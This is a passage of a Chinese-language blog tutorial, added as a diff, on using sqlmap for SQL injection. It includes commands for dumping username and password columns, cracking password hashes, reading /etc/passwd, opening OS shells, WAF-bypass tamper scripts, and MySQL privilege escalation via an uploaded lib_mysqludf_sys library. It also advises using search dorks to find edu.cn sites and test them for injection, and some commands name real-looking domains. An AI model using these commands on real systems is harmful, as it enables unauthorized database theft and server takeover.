+<li><h5 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h5><ol>
+<li><p>–technique=TECH  SQL注入技术测试（默认BEUST）</p>
+<p>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p>
+<p>–union-cols=UCOLS 定列范围用于测试UNION查询注入</p>
+<p>–union-char=UCHAR 暴力猜测列的字符数</p>
+<p>–union-from=UFROM SQL注入UNION查询使用的格式</p>
+<p>–dns-domain=DNS.. DNS泄露攻击使用的域名</p>
+<p>–second-order=S.. URL搜索产生的结果页面</p>
+</li>
+</ol>
+</li>
+<li><h5 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h5><ol>
+<li>-f, –fingerprint  执行广泛的DBMS版本指纹检查</li>
+</ol>
+</li>
+<li><h5 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h5><ol>
+<li><p>-a, –all      获取所有信息</p>
+<p> -b, –banner    获取数据库管理系统的标识</p>
+<p> –current-user   获取数据库管理系统当前用户</p>
+<p> –current-db    获取数据库管理系统当前数据库</p>
+<p> –hostname     获取数据库服务器的主机名称</p>
+<p> –is-dba      检测DBMS当前用户是否DBA</p>
+<p> –users       枚举数据库管理系统用户</p>
+<p> –passwords     枚举数据库管理系统用户密码哈希</p>
+<p> –privileges    枚举数据库管理系统用户的权限</p>
+<p> –roles      枚举数据库管理系统用户的角色</p>
+<p> –dbs       枚举数据库管理系统数据库</p>
+<p> –tables      枚举的DBMS数据库中的表</p>
+<p> –columns     枚举DBMS数据库表列</p>
+<p> –schema      枚举数据库架构</p>
+<p> –count       检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap -u url –count -D testdb</p>
+<p> –dump      转储数据库表项</p>
+<p> –dump-all     转储数据库所有表项</p>
+<p> –search      搜索列（S），表（S）和/或数据库名称（S）</p>
+<p> –comments     获取DBMS注释</p>
+<p> -D DB        要进行枚举的指定数据库名</p>
+<p> -T TBL       DBMS数据库表枚举</p>
+<p> -C COL       DBMS数据库表列枚举</p>
+<p> -X EXCLUDECOL   DBMS数据库表不进行枚举</p>
+<p> -U USER      用来进行枚举的数据库用户</p>
+<p> –exclude-sysdbs  枚举表时排除系统数据库</p>
+<p> –pivot-column=P.. Pivot columnname</p>
+<p> –where=DUMPWHERE  Use WHEREcondition while table dumping</p>
+<p> –start=LIMITSTART 获取第一个查询输出数据位置</p>
+<p> –stop=LIMITSTOP  获取最后查询的输出数据</p>
+<p> –first=FIRSTCHAR  第一个查询输出字的字符获取</p>
+<p> –last=LASTCHAR  最后查询的输出字字符获取</p>
+<p> –sql-query=QUERY  要执行的SQL语句</p>
+<p> –sql-shell     提示交互式SQL的shell</p>
+<p> –sql-file=SQLFILE 要执行的SQL文件</p>
+</li>
+</ol>
+</li>
+<li><h5 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h5><ol>
+<li><p>–common-tables   检查存在共同表</p>
+<p> –common-columns  检查存在共同列</p>
+</li>
+</ol>
+</li>
+<li><h5 id="自定义函数注入"><a href="#自定义函数注入" class="headerlink" title="自定义函数注入"></a>自定义函数注入</h5><ol>
+<li><p>–udf-inject  注入用户自定义函数</p>
+<p> –shared-lib=SHLIB 共享库的本地路径</p>
+</li>
+</ol>
+</li>
+<li><h5 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h5><ol>
+<li><p>–file-read=RFILE  从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:</p>
+<p>sqlmap -u”<a href="http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“–file-read</a> “C:/example.exe” -v 1</p>
+<p>  –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</p>
+<p>  –file-dest=DFILE  后端的数据库管理系统写入文件的绝对路径</p>
+</li>
+</ol>
+</li>
+<li><h5 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h5><ol>
+<li><p>–os-cmd=OSCMD  执行操作系统命令（OSCMD）</p>
+<p>–os-shell     交互式的操作系统的shell</p>
+<p>–os-pwn     获取一个OOB shell，meterpreter或VNC</p>
+<p>–os-smbrelay    一键获取一个OOBshell，meterpreter或VNC</p>
+<p>–os-bof      存储过程缓冲区溢出利用</p>
+<p>–priv-esc     数据库进程用户权限提升</p>
+<p>–msf-path=MSFPATH MetasploitFramework本地的安装路径</p>
+<p>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p>
+</li>
+<li><p>linux查看当前用户命令：</p>
+<p>sqlmap -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –os-cmd id -v1</p>
+</li>
+</ol>
+</li>
+<li><h5 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h5><ol>
+<li><p>–reg-read     读一个Windows注册表项值</p>
+<p>–reg-add      写一个Windows注册表项值数据</p>
+<p>–reg-del      删除Windows注册表键值</p>
+<p>–reg-key=REGKEY  Windows注册表键</p>
+<p>–reg-value=REGVAL Windows注册表项值</p>
+<p>–reg-data=REGDATA Windows注册表键值数据</p>
+<p>–reg-type=REGTYPE Windows注册表项值类型</p>
+</li>
+</ol>
+</li>
+<li><h5 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h5><ol>
+<li><h5 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h5><p>参数：–technique</p>
+<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。</p>
+<p>支持的探测方式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection（布尔型注入）</span><br><span class="line">E: Error-based SQL injection（报错型注入）</span><br><span class="line">U: UNION query SQL injection（可联合查询注入）</span><br><span class="line">S: Stacked queries SQL injection（可多语句查询注入）</span><br><span class="line">T: Time-based blind SQL injection（基于时间延迟注入）</span><br></pre></td></tr></table></figure>
+
+<h5 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h5><p>参数：–time-sec</p>
+<p>当使用基于时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p>
+<h5 id="设定UNION查询字段数"><a href="#设定UNION查询字段数" class="headerlink" title="设定UNION查询字段数"></a>设定UNION查询字段数</h5><p>参数：–union-cols</p>
+<p>默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。设定–union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。</p>
+<h5 id="设定UNION查询使用的字符"><a href="#设定UNION查询使用的字符" class="headerlink" title="设定UNION查询使用的字符"></a>设定UNION查询使用的字符</h5><p>参数：–union-char</p>
+<p>默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用–union-char只定UNION查询的字符。</p>
+<h5 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h5><p>参数：–second-order</p>
+<p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p>
+</li>
+</ol>
+</li>
+<li><h5 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h5><ol>
+<li><p>-s SESSIONFILE   保存和恢复检索会话文件的所有数据</p>
+<p>-t TRAFFICFILE   记录所有HTTP流量到一个文本文件中</p>
+<p>–batch      从不询问用户输入，使用所有默认配置。</p>
+<p>–binary-fields=.. 结果字段具有二进制值(e.g.”digest”)</p>
+<p>–charset=CHARSET  强制字符编码</p>
+<p>–crawl=CRAWLDEPTH 从目标URL爬行网站</p>
+<p>–crawl-exclude=.. 正则表达式从爬行页中排除</p>
+<p>–csv-del=CSVDEL  限定使用CSV输出 (default”,”)</p>
+<p>–dump-format=DU.. 转储数据格式(CSV(default), HTML or SQLITE)</p>
+<p>–eta       显示每个输出的预计到达时间</p>
+<p>–flush-session   刷新当前目标的会话文件</p>
+<p>–forms      解析和测试目标URL表单</p>
+<p>–fresh-queries   忽略在会话文件中存储的查询结果</p>
+<p>–hex       使用DBMS Hex函数数据检索</p>
+<p>–output-dir=OUT.. 自定义输出目录路径</p>
+<p>–parse-errors   解析和显示响应数据库错误信息</p>
+<p>–save=SAVECONFIG  保存选项到INI配置文件</p>
+<p>–scope=SCOPE  从提供的代理日志中使用正则表达式过滤目标</p>
+<p>–test-filter=TE.. 选择测试的有效载荷和/或标题(e.g. ROW)</p>
+<p>–test-skip=TEST.. 跳过试验载荷和/或标题(e.g.BENCHMARK)</p>
+<p>–update      更新sqlmap</p>
+</li>
+</ol>
+</li>
+<li><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ol>
+<li><p>-z MNEMONICS    使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</p>
+<p>–alert=ALERT    发现SQL注入时，运行主机操作系统命令</p>
+<p>–answers=ANSWERS  当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap -u”<a href="http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”" target="_blank" rel="noopener">http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”</a> –batch</p>
+<p>–beep  发现sql注入时，发出蜂鸣声。</p>
+<p>–cleanup   清除sqlmap注入时在DBMS中产生的udf与表。</p>
+<p>–dependencies   Check formissing (non-core) sqlmap dependencies</p>
+<p>–disable-coloring 默认彩色输出，禁掉彩色输出。</p>
+<p>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</p>
+<p>–identify-waf   进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</p>
+<p>–mobile   有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p>
+<p>–offline      Work inoffline mode (only use session data)</p>
+<p>–purge-output   从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
+<p>–skip-waf      跳过WAF／IPS / IDS启发式检测保护</p>
+<p>–smart      进行积极的启发式测试，快速判断为注入的报错点进行注入</p>
+<p>–sqlmap-shell   互动提示一个sqlmapshell</p>
+<p>–tmp-dir=TMPDIR  用于存储临时文件的本地目录</p>
+<p>–web-root=WEBROOT Web服务器的文档根目录(e.g.”/var/www”)</p>
+<p>–wizard  新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h3 id="sqlmap实际利用"><a href="#sqlmap实际利用" class="headerlink" title="sqlmap实际利用"></a>sqlmap实际利用</h3><ol>
+<li><h4 id="检测和利用SQL注入"><a href="#检测和利用SQL注入" class="headerlink" title="检测和利用SQL注入"></a>检测和利用SQL注入</h4><ol>
+<li><h5 id="手工判断是否存在漏洞"><a href="#手工判断是否存在漏洞" class="headerlink" title="手工判断是否存在漏洞"></a>手工判断是否存在漏洞</h5><ol>
+<li><p>对动态网页进行安全审计，通过接受动态用户提供的GET、POST、Cookie参数值、User-Agent请求头。</p>
+<p>原始网页：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></p>
+<p>构造url1：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1</a></p>
+<p>构造url2：<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2</a></p>
+<p>如果url1访问结果跟原始网页一致，而url2跟原始网页不一致，有出错信息或者显示内容不一致，则证明存在SQL注入。</p>
+</li>
+<li><h5 id="sqlmap自动检测"><a href="#sqlmap自动检测" class="headerlink" title="sqlmap自动检测"></a>sqlmap自动检测</h5><ol>
+<li>检测语法：sqlmap -u <a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1</a></li>
+</ol>
+<p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断。</p>
+</li>
+<li><h5 id="寻找和判断"><a href="#寻找和判断" class="headerlink" title="寻找和判断"></a>寻找和判断</h5><ol>
+<li>通过百度对“inurl:news.asp?id=site:edu.cn”、“inurl:news.php?id= site:edu.cn”、“inurl:news.aspx?id=site:edu.cn”进行搜索，搜索news.php/asp/aspx，站点为edu.cn，如图1所示。随机打开一个网页搜索结果，如图所示，如果能够正常访问，则复制该URL地址。</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpvrzfhj30cs0b4758.jpg" alt="超详细SQLMap使用攻略及技巧"></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrpzhg3yj30e807sq3d.jpg" alt="图2测试网页能否正常访问.jpg"></p>
+<p>将该url使用sqlmap进行注入测试，如图3所示，测试结果可能存在SQL注入，也可能不存在SQL注入，存在则可以进行数据库名称，数据库表以及数据的操作。本例中是不存在SQL注入漏洞。</p>
+</li>
+<li><h5 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h5><ol>
+<li>将目标url搜集并整理为txt文件，如图4所示，所有文件都保存为tg.txt，然后使用“sqlmap-m tg.txt”，注意tg.txt跟sqlmap在同一个目录下。</li>
+</ol>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gdqrq62op2j30i009876b.jpg" alt="图4批量整理目标地址.jpg"></p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h4 id="直接连接数据库"><a href="#直接连接数据库" class="headerlink" title="直接连接数据库"></a>直接连接数据库</h4><ol>
+<li>sqlmap -d”mysql://admin:<a href="mailto:admin@192.168.21.17">admin@192.168.21.17</a>:3306/testdb” -f –banner –dbs–users</li>
+</ol>
+</li>
+<li><h4 id="数据库相关操作"><a href="#数据库相关操作" class="headerlink" title="数据库相关操作"></a>数据库相关操作</h4><p>1.列数据库信息：–dbs</p>
+<p>2.web当前使用的数据库–current-db</p>
+<p>3.web数据库使用账户–current-user</p>
+<p>4.列出sqlserver所有用户 –users</p>
+<p>5.数据库账户与密码 –passwords</p>
+<p>6.指定库名列出所有表  -D database –tables</p>
+<p>-D：指定数据库名称</p>
+<p>7.指定库名表名列出所有字段 -D antian365-T admin –columns</p>
+<p>-T：指定要列出字段的表</p>
+<p>8.指定库名表名字段dump出指定字段</p>
+<p>-D secbang_com -T admin -C id,password ,username –dump</p>
+<p>-D antian365 -T userb -C”email,Username,userpassword” –dump</p>
+<p> 可加双引号，也可不加双引号。</p>
+<p>9.导出多少条数据</p>
+<p>-D tourdata -T userb -C”email,Username,userpassword” –start 1 –stop 10 –dump </p>
+<p>参数：</p>
+<p>–start：指定开始的行</p>
+<p>–stop：指定结束的行</p>
+<p>此条命令的含义为：导出数据库tourdata中的表userb中的字段(email,Username,userpassword)中的第1到第10行的数据内容。</p>
+</li>
+</ol>
+</li>
+<li><h3 id="SQLMAP实用技巧"><a href="#SQLMAP实用技巧" class="headerlink" title="SQLMAP实用技巧"></a>SQLMAP实用技巧</h3><ol>
+<li><h4 id="mysql的注释方法进行绕过WAF进行SQL注入"><a href="#mysql的注释方法进行绕过WAF进行SQL注入" class="headerlink" title="mysql的注释方法进行绕过WAF进行SQL注入"></a>mysql的注释方法进行绕过WAF进行SQL注入</h4><ol>
+<li><p>修改C:\Python27\sqlmap\tamper\halfversionedmorekeywords.py</p>
+<p>return match.group().replace(word,”/*!0%s” % word) 为：</p>
+<p>return match.group().replace(word,”/<em>!50000%s</em>/” % word)</p>
+</li>
+<li><p>修改C:\Python27\sqlmap\xml\queries.xml</p>
+<p>&lt;cast query=”CAST(%s ASCHAR)”/&gt;为：</p>
+<p>&lt;castquery=”convert(%s,CHAR)”/&gt;</p>
+</li>
+<li><p>使用sqlmap进行注入测试</p>
+<p>sqlmap -u”http://**.com/detail.php? id=16″ –tamper “halfversionedmorekeywords.py”</p>
+<p>其它绕过waf脚本方法：</p>
+<p>sqlmap-u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1”</a> –tampertamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</p>
+</li>
+<li><p>tamper目录下文件具体含义：</p>
+<ol>
+<li><p>space2comment.py用/**/代替空格</p>
+<p>apostrophemask.py用utf8代替引号</p>
+<p>equaltolike.pylike代替等号</p>
+<p>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</p>
+<p>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</p>
+<p>space2hash.py空格替换为#号,随机字符串以及换行符</p>
+<p>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</p>
+<p>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p>
+<p>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</p>
+<p>appendnullbyte.py在有效负荷结束位置加载零字节字符编码</p>
+<p>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</p>
+<p>space2mssqlblank.py(mssql)空格替换为其它空符号</p>
+<p>base64encode.py　用base64编码替换</p>
+<p>space2mssqlhash.py　替换空格</p>
+<p>modsecurityversioned.py过滤空格，包含完整的查询版本注释</p>
+<p>space2mysqlblank.py　空格替换其它空白符号(mysql)</p>
+<p>between.py用between替换大于号（&gt;）</p>
+<p>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p>
+<p>multiplespaces.py围绕SQL关键字添加多个空格</p>
+<p>space2plus.py用+替换空格</p>
+<p>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like</p>
+<p>nonrecursivereplacement.py双重查询语句,取代SQL关键字</p>
+<p>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
+<p>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p>
+<p>chardoubleencode.py双url编码(不处理以编码的)</p>
+<p>unionalltounion.py替换UNION ALLSELECT UNION SELECT</p>
+<p>charencode.py　url编码</p>
+<p>randomcase.py随机大小写</p>
+<p>unmagicquotes.py宽字符绕过 GPCaddslashes</p>
+<p>randomcomments.py用/**/分割sql关键字</p>
+<p>charunicodeencode.py字符串 unicode 编码</p>
+<p>securesphere.py追加特制的字符串</p>
+<p>versionedmorekeywords.py注释绕过</p>
+<p>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</p>
+<p>halfversionedmorekeywords.py关键字前加注释</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h4 id="URL重写SQL注入测试"><a href="#URL重写SQL注入测试" class="headerlink" title="URL重写SQL注入测试"></a>URL重写SQL注入测试</h4><ol>
+<li><p>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</p>
+<p>sqlmap -u”<a href="http://targeturl/param1/value1*/param2/value2/”" target="_blank" rel="noopener">http://targeturl/param1/value1*/param2/value2/”</a></p>
+</li>
+</ol>
+</li>
+<li><h4 id="列举并破解密码哈希值"><a href="#列举并破解密码哈希值" class="headerlink" title="列举并破解密码哈希值"></a>列举并破解密码哈希值</h4><ol>
+<li><p>当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p>
+<p>sqlmap -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –passwords -v1</p>
+</li>
+</ol>
+</li>
+<li><h4 id="获取表中的数据个数"><a href="#获取表中的数据个数" class="headerlink" title="获取表中的数据个数"></a>获取表中的数据个数</h4><ol>
+<li>sqlmap -u”<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”" target="_blank" rel="noopener">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”</a> –count -Dtestdb</li>
+</ol>
+</li>
+<li><h4 id="对网站secbang-com进行漏洞爬取"><a href="#对网站secbang-com进行漏洞爬取" class="headerlink" title="对网站secbang.com进行漏洞爬取"></a>对网站secbang.com进行漏洞爬取</h4><ol>
+<li>sqlmap -u “<a href="http://www.secbang.com/" target="_blank" rel="noopener">http://www.secbang.com</a>“–batch –crawl=3</li>
+</ol>
+</li>
+<li><h4 id="基于布尔SQL注入预估时间"><a href="#基于布尔SQL注入预估时间" class="headerlink" title="基于布尔SQL注入预估时间"></a>基于布尔SQL注入预估时间</h4><ol>
+<li>sqlmap -u “<a href="http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b</a> –eta</li>
+</ol>
+</li>
+<li><h4 id="使用hex避免字符编码导致数据丢失"><a href="#使用hex避免字符编码导致数据丢失" class="headerlink" title="使用hex避免字符编码导致数据丢失"></a>使用hex避免字符编码导致数据丢失</h4><ol>
+<li>sqlmap -u “<a href="http://192.168.48.130/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.48.130/pgsql/get_int.php?id=1”</a> –banner –hex -v 3 –parse-errors</li>
+</ol>
+</li>
+<li><h4 id="模拟测试手机环境站点"><a href="#模拟测试手机环境站点" class="headerlink" title="模拟测试手机环境站点"></a>模拟测试手机环境站点</h4><ol>
+<li>sqlmap -u”<a href="http://www.target.com/vuln.php?id=1”" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1”</a> –mobile</li>
+</ol>
+</li>
+<li><h4 id="智能判断测试"><a href="#智能判断测试" class="headerlink" title="智能判断测试"></a>智能判断测试</h4><ol>
+<li>sqlmap -u “<a href="http://www.antian365.com/info.php?id=1“–batch" target="_blank" rel="noopener">http://www.antian365.com/info.php?id=1“–batch</a> –smart</li>
+</ol>
+</li>
+<li><h4 id="结合burpsuite进行注入"><a href="#结合burpsuite进行注入" class="headerlink" title="结合burpsuite进行注入"></a>结合burpsuite进行注入</h4><ol>
+<li><p>burpsuite抓包，需要设置burpsuite记录请求日志</p>
+<p>sqlmap -r burpsuite抓包.txt</p>
+</li>
+<li><p>指定表单注入</p>
+<p>sqlmap -u URL –data“username=a&amp;password=a”</p>
+</li>
+</ol>
+</li>
+<li><h4 id="sqlmap自动填写表单注入"><a href="#sqlmap自动填写表单注入" class="headerlink" title="sqlmap自动填写表单注入"></a>sqlmap自动填写表单注入</h4><ol>
+<li><p>sqlmap -u URL –forms</p>
+<p>sqlmap -u URL –forms –dbs</p>
+<p>sqlmap -u URL –forms –current-db</p>
+<p>sqlmap -u URL –forms -D 数据库名称–tables</p>
+<p>sqlmap -u URL –forms -D 数据库名称 -T 表名 –columns</p>
+<p>sqlmap -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump</p>
+</li>
+</ol>
+</li>
+<li><h4 id="读取linux下文件"><a href="#读取linux下文件" class="headerlink" title="读取linux下文件"></a>读取linux下文件</h4><ol>
+<li>sqlmap-u “url” –file /etc/password</li>
+</ol>
+</li>
+<li><h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><ol>
+<li>sqlmap -u URL –technique -T–current-user</li>
+</ol>
+</li>
+<li><h4 id="sqlmap-结合burpsuite进行post注入"><a href="#sqlmap-结合burpsuite进行post注入" class="headerlink" title="sqlmap 结合burpsuite进行post注入"></a>sqlmap 结合burpsuite进行post注入</h4><ol>
+<li><p>结合burpsuite来使用sqlmap：</p>
+<p>（1）浏览器打开目标地址<a href="http://www.antian365.com/" target="_blank" rel="noopener">http://www.antian365.com</a></p>
+<p>（2）配置burp代理(127.0.0.1:8080)以拦截请求</p>
+<p>（3）点击登录表单的submit按钮</p>
+<p>（4）Burp会拦截到了我们的登录POST请求</p>
+<p>（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p>
+<p>（6）运行sqlmap并使用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;sqlmap -r post.txt -p tfUPass</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><h4 id="sqlmap-cookies注入"><a href="#sqlmap-cookies注入" class="headerlink" title="sqlmap cookies注入"></a>sqlmap cookies注入</h4><ol>
+<li><p>sqlmap -u “<a href="http://127.0.0.1/base.PHP“–cookies" target="_blank" rel="noopener">http://127.0.0.1/base.PHP“–cookies</a> “id=1″ –dbs –level 2</p>
+<p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 注入点URL --cookie&quot;id&#x3D;xx&quot; --level 3</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 --tables(猜表名)</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 --coiumns</span><br><span class="line">sqlmap -u url --cookie &quot;id&#x3D;xx&quot;--level 3 -T 表名 -C username，password --dump</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li><h4 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h4><ol>
+<li><p>连接mysql数据打开一个交互shell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --sql-shell</span><br><span class="line">select @@version;</span><br><span class="line">select @@plugin_dir;</span><br><span class="line">d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -dmysql:&#x2F;&#x2F;root:root@127.0.0.1:3306&#x2F;test --file-write&#x3D;d:&#x2F;tmp&#x2F;lib_mysqludf_sys.dll--file-dest&#x3D;d:\\wamp2.5\\bin\\mysql\\mysql5.6.17\\lib\\plugin\\lib_mysqludf_sys.dll</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRINGSONAME &#39;lib_mysqludf_sys.dll&#39;</span><br><span class="line">select sys_eval(&#39;ver&#39;);</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<ol start="7">
+<li><h4 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h4><ol>
+<li><p>sqlmap -u “url” –os-cmd=”netuser” /<em>执行net user命令</em>/</p>
+<p>sqlmap -u “url” –os-shell /<em>系统交互的shell</em>/</p>
+</li>
+</ol>
+<ol start="8">
+<li><h4 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h4><ol>
+<li><p>sqlmap –dbs -u”url” –delay 0.5 /<em>延时0.5秒</em>/</p>
+<p>sqlmap –dbs -u”url” –safe-freq /<em>请求2次</em>/</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
